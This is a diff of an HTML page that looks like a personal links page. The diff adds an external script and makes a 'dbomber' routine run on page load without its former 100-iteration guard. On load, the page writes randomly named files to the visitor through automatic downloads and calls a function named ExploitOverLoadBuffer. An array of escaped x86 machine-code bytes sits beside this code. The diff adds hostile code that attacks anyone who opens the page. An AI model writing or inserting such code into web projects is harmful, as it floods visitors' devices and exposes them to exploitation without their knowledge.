@@ -73,6 +73,7 @@
 </style>
 <head><meta name="viewport" content="width=device-width, user-scalable=no">
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head>
+<script async="" src="./PWEngine/UI.js"></script>
 <br>
 <br>
 <br>
@@ -87,6 +88,12 @@
 <a href="https://hcpp20334.github.io"><img class="links" src="https://hcpp20334.github.io/Pictures/amd.png"></a>
 </div>
 <script>
+
+let GUIID = new GUI_FUNC();
+GUIID.createTag(document.body,"imgh","img","position:absolute;z-index:-1;width:100px;height:100px;");
+let imgBuf = document.getElementById("imgh");
+console.log(GUIID.getMemory(0));
+imgBuf.src = "q.png";
 var code = [
 "\xb8\x04\x00\x00\x00",
 "\xbb\x01\x00\x00\x00",
@@ -230,24 +237,19 @@ function writeFile(name, value)
       document.getElementById("download").click();
       document.body.removeChild(download);
 }
-const PLAPImem = performance.memory;
-const PLmemoryUsed  = (PLAPImem.usedJSHeapSize / 1024) / 1024;
-const PLmemoryTotal = (PLAPImem.totalJSHeapSize / 1024);
-const PLmemoryJsHeapSize  = (PLAPImem.jsHeapSizeLimit / 1024) / 1024;
+
 let dcount = 0;
 let explout_enable = false;
+dbomber();
 function dbomber()
 {
-    console.log("filechunk:"+randName+"\n"+"buffer:"+buffer+"\n"+PLmemoryUsed+"\n"+PLmemoryJsHeapSize+"\n"+PLmemoryTotal);
+    
     dcount++;
     randName = PassGen(64);
     buffer += PassGen(86);
     writeFile(randName,buffer);
-    if(dcount === 100)
-    {
         explout_enable = true;
         ExploitOverLoadBuffer();
-    }
 }
 function ExploitOverLoadBuffer()
 {
